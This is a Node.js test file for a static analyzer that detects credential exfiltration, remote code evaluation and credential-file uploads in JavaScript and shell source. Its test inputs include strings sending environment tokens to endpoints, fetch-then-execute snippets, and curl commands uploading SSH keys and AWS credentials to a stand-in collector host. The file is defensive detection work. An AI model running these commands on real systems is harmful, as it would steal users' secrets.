"use strict";
const test = require('node:test');
const assert = require('node:assert/strict');
const { createFlowAnalysis } = require('../src/flow-analysis');
const { sensitiveFlowHints } = require('../src/sensitive-flows');
const { shellUploadHints } = require('../src/shell-flows');
function hints(source) { return sensitiveFlowHints(source); }

test('class bodies and alternate APIs retain sensitive-flow warnings without executing source', () => {
  // Static evidence only. These strings are never evaluated or sent anywhere.
  const body = "fetch('/api', {body: process.env.TEST_TOKEN})";
  for (const source of [
    `class Client { send() { ${body} } }`,
    `class Client { static { ${body} } }`,
    `const Client = class { field = ${body} };`,
    "const socket=require('node:tls').connect(443,'example.invalid'); socket.write(process.env.TEST_TOKEN);",
    "const socket=require('net').connect(443,'example.invalid',()=>socket.write(process.env.TEST_TOKEN));",
    "require('child_process').execFile('example', [process.env.TEST_TOKEN]);",
    "Reflect.apply(fetch, null, ['/api', {body:process.env.TEST_TOKEN}]);",
    "const send=fetch.bind(null,'/api'); send({body:process.env.TEST_TOKEN});",
    "fetch('/api',{body:Bun.env.TEST_TOKEN});",
    "const env=new Proxy(process.env,{}); fetch('/api',{body:env.TEST_TOKEN});",
    "const root=Function('return this')(); root.fetch('/api',{body:root.process.env.TEST_TOKEN});"
  ]) assert.ok(hints(source).some(h => h.kind === 'credential-export'), source);
  for (const source of [
    "class Client { static label = 'ok'; send() { fetch('/health') } }",
    "const socket=require('tls').connect(443,'example.invalid'); socket.write('public');",
    "const process={env:{TEST_TOKEN:'public'}}; Reflect.apply(fetch,null,['/api',{body:process.env.TEST_TOKEN}]);",
    "function demo(Bun) { fetch('/api',{body:Bun.env.TEST_TOKEN}); } demo({env:{TEST_TOKEN:'public'}});"
  ]) assert.deepEqual(hints(source), [], source);
});

test('unmodeled executable syntax and string timers remain visible coverage gaps', () => {
  for (const source of [
    "class Derived extends UnknownBase {}",
    "setTimeout('console.log(1)', 1);",
    "const x={get value(){return 1}};"
  ]) assert.ok(hints(source).some(h => h.kind === 'flow-analysis-gap'), source);
  const analysis = { status: 'unmodeled', hints: Array.from({length:8}, (_, index) => ({index,kind:'credential-export'})) };
  assert.ok(sensitiveFlowHints('', {analysis}).some(h => h.kind === 'flow-analysis-gap'));
});

test('switch branches preserve sensitive values and benign state machines stay modeled', () => {
  assert.deepEqual(hints("let state=0; switch(mode){case 1:state=1;break;default:state=2;}"),[]);
  for (const source of [
    "let token='public'; switch(mode){case 1:token=process.env.TEST_TOKEN;break;case 2:token='public'} fetch('/api',{body:token});",
    "let token='public'; switch(mode){case 1:token=process.env.TEST_TOKEN;case 2:fetch('/api',{body:token});break;}"
  ]) assert.ok(hints(source).some(h=>h.kind==='credential-export'));
});

test('branch-joined functions retain callable metadata and sensitive return values', () => {
  const benign = "let select = function(x){return x}; if(flag)select=function(x){return x+1}; select(4);";
  assert.deepEqual(hints(benign),[]);
  const secret = "let select = function(){return 'public'}; if(flag)select=function(){return process.env.TEST_TOKEN}; fetch('/api',{body:select()});";
  assert.ok(hints(secret).some(h=>h.kind==='credential-export'));
  assert.deepEqual(hints("function walk(x){if(x)return walk(x.next);return 0} walk({});"),[]);
  const prototype = 'var Item=(function(){function Item(){} ' + Array.from({length:12},(_,i)=>`Item.prototype.m${i}=function(){return ${i}};`).join('') + 'return Item;})(); new Item();';
  assert.deepEqual(hints(prototype),[], 'prototype methods must not become constructor return alternatives');
});

test('located assignment gaps distinguish inert writes from lost sensitive values', () => {
  assert.deepEqual(hints('function f(x){x.child.flag=true;}'),[]);
  const source = "function f(x){x.child.secret=process.env.TEST_TOKEN;}";
  const gap = hints(source).find(h=>h.kind==='flow-analysis-gap');
  assert.equal(gap.nodeType,'AssignmentExpression');
  assert.ok(gap.index > 0);
});

test('AST follows assignments in order and merges branches conservatively', () => {
  for (const source of [
    "let x=''; x=process.env.NPM_TOKEN; fetch('/endpoint',{body:x});",
    "let x=''; if(flag){x=process.env.NPM_TOKEN} fetch('/endpoint',{body:x});",
    "let x=process.env.NPM_TOKEN; while(flag){x='public'} fetch('/api',{body:x});",
    "const secret=process.env.NPM_TOKEN; function send(value){fetch('/api',{body:value})} send(secret);",
    "const prefix='NPM_'; const key=prefix+'TOKEN'; fetch(`/api?key=${process.env[key]}`);"
  ]) assert.ok(hints(source).some(h => h.kind === 'credential-export'), source);
  for (const source of [
    "let x=process.env.NPM_TOKEN; x='public'; fetch('/api',{body:x});",
    "const x=process.env.NPM_TOKEN; function send(x){fetch('/api',{body:x})} send('public');",
    "function read(process){fetch('/api',{body:process.env.NPM_TOKEN})} read({env:{NPM_TOKEN:'public'}});",
    "const token=process.env.NPM_TOKEN; { const token='public'; fetch('/api',{body:token}) }",
    "fetch(`https://service.invalid/?mode=${process.env.NODE_ENV}`);",
    "const example='fetch(`${process.env.NPM_TOKEN}`)';"
  ]) assert.deepEqual(hints(source), [], source);
});
test('AST preserves sensitive sources and sinks through arrays, Maps and promise callbacks', () => {
  for (const source of [
    "const calls=[fetch]; calls[0]('/collect',{body:process.env.NPM_TOKEN})",
    "const [send]=[fetch]; send('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=new Map([['send',fetch]]); calls.get('send')('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=new Map(); calls.set('send',fetch); calls.get('send')('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=[[fetch]]; calls[0][0]('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=[]; calls.push(fetch); calls[0]('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=[null]; calls[0]=fetch; calls[0]('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=Object.values({send:fetch}); calls[0]('/collect',{body:process.env.NPM_TOKEN})",
    "const calls=Array.of(fetch); calls.at(0)('/collect',{body:process.env.NPM_TOKEN})",
    "const C=[WebSocket][0]; const ws=new C('wss://example.invalid'); ws.send(process.env.NPM_TOKEN)"
  ]) assert.ok(hints(source).some(h => h.kind === 'credential-export'), source);

  const remote = hints("fetch('/code').then(r=>r.text()).then(code=>({}).constructor.constructor(code)())");
  assert.ok(remote.some(h => h.kind === 'remote-vm-code'));
  assert.ok(hints("fetch('/code').then(r=>r.text()).then(code=>[]['filter']['constructor'](code)())")
    .some(h => h.kind === 'remote-vm-code'));

  const crossFile = createFlowAnalysis([
    {path:'config.js',content:"module.exports=[process['e'+'nv']]"},
    {path:'index.js',content:"const [env]=require('./config'); const [send]=[fetch]; send('/collect',{body:env.NPM_TOKEN})"}
  ]).analyze('index.js');
  assert.ok(crossFile.hints.some(h => h.kind === 'credential-export'));
});
test('AST resolves named/default CommonJS and ES module flows through local chains', () => {
  for (const sourceFiles of [
    { 'index.js': "const cfg=require('./nested/config'); fetch('/api',{body:cfg.token})", 'nested/config.js': "exports.token=process.env.NPM_TOKEN" },
    { 'index.js': "import {token as value} from './config.mjs'; fetch('/api',{body:value})", 'config.mjs': "export const token=process.env.NPM_TOKEN" },
    { 'index.js': "import value from './config.mjs'; fetch('/api',{body:value})", 'config.mjs': "export default process.env.NPM_TOKEN" },
    { 'index.js': "const value=require('./bridge'); fetch('/api',{body:value})", 'bridge.js': "module.exports=require('./config')", 'config.js': "module.exports=process.env.NPM_TOKEN" }
  ]) {
    const run = createFlowAnalysis(Object.entries(sourceFiles).map(([path, content]) => ({ path, content })));
    assert.ok(run.analyze('index.js').hints.some(h => h.kind === 'credential-export'));
  }
  const run = createFlowAnalysis([{ path: 'index.js', content: "const cfg=require('./config'); fetch('/api',{body:cfg.public})" },
    { path: 'config.js', content: "module.exports={secret:process.env.NPM_TOKEN, public:'ready'}" }]);
  assert.deepEqual(run.analyze('index.js').hints, []);
});
test('AST catches remote imports and aliased/chained request sinks', () => {
  for (const source of [
    "const code=await (await fetch('/script')).text(); await import('data:text/javascript,'+code);",
    "const {request: send}=require('node:https'); send('/api').end(process.env.NPM_TOKEN);",
    "const https=require('https'); const req=https.request('/api'); req.write(process.env.NPM_TOKEN); req.end();"
  ]) assert.ok(hints(source).length, source);
  assert.deepEqual(hints("const code=await (await fetch('/data')).text(); JSON.parse(code);"), []);
});
test('cycles, missing modules and resource limits cannot silently clear flow analysis', () => {
  const sources = [{ path: 'a.js', content: "module.exports=require('./b')" }, { path: 'b.js', content: "module.exports=require('./a')" }];
  const analysis = createFlowAnalysis(sources).analyze('a.js');
  assert.equal(analysis.status, 'cycle');
  assert.ok(sensitiveFlowHints(sources[0].content, { analysis }).some(h => h.kind === 'flow-analysis-gap'));
  assert.ok(hints("const x=require('./missing'); fetch('/api',{body:x})").some(h => h.kind === 'flow-analysis-gap'));
  assert.ok(hints('/*' + 'x'.repeat(1024 * 1024)).some(h => h.kind === 'flow-analysis-gap'));
});
test('shell upload detection distinguishes executable curl arguments from quoted documentation and public keys', () => {
  for (const source of ["curl --data-binary @\"$HOME/.ssh/id_ed25519\" https://collector.invalid",
    "curl -T ~/.aws/credentials https://collector.invalid", "curl --data=@~/.npmrc https://collector.invalid"]) {
    assert.equal(shellUploadHints(source)[0]?.kind, 'credential-file-upload');
  }
  for (const source of ["echo 'curl -T ~/.ssh/id_rsa https://collector.invalid'", "# curl -T ~/.ssh/id_rsa x",
    "curl -T ~/.ssh/id_rsa.pub https://service.invalid", "curl --data-raw @~/.ssh/id_rsa https://service.invalid"]) assert.deepEqual(shellUploadHints(source), []);
});
